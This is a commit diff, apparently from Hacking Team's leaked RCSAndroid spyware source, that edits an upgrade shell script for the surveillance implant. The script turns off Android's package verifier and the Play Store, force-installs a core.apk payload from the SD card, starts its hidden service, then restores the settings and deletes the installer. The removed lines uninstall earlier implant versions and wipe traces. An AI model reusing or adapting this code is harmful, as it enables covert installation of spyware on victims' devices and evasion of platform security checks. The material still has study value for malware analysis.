56a13081fccdc20922f6fd9f3a194c0f5bb11bf6
Zeno <zeno@hackingteam.com>
2014-09-19 15:52:14 +0200

    upgrade

--- RCSAndroid/server/template/upgrade.sh
+++ RCSAndroid/server/template/upgrade.sh
@@ -8,31 +8,18 @@ settings put global package_verifier_enable 0
 pm disable com.android.vending
 sleep 1
 
-pm install -f /sdcard/core.apk
+pm install -r /sdcard/core.apk
 sleep 2
 
 am startservice com.android.dvci/.ServiceMain
 am broadcast -a android.intent.action.USER_PRESENT
-#pm disable com.android.deviceinfo
-#pm uninstall com.android.deviceinfo
-
-for geb in `ls /data/data/*/files/geb`; do
-	init=${geb#/data/data/}
-    package=${init%%/*}
-
-    pm disable $package
-    pm uninstall $package
-done
 
 sleep 2
 settings put global package_verifier_enable 1
 pm enable com.android.vending
 
 rm /sdcard/core.apk
-rm -r /sdcard/.lost.found
-#rm -r /data/data/com.android.deviceinfo
-#rm /data/app/com.android.deviceinfo*
-#rm -r /data/app-lib/com.android.deviceinfo*
+
 
 
 
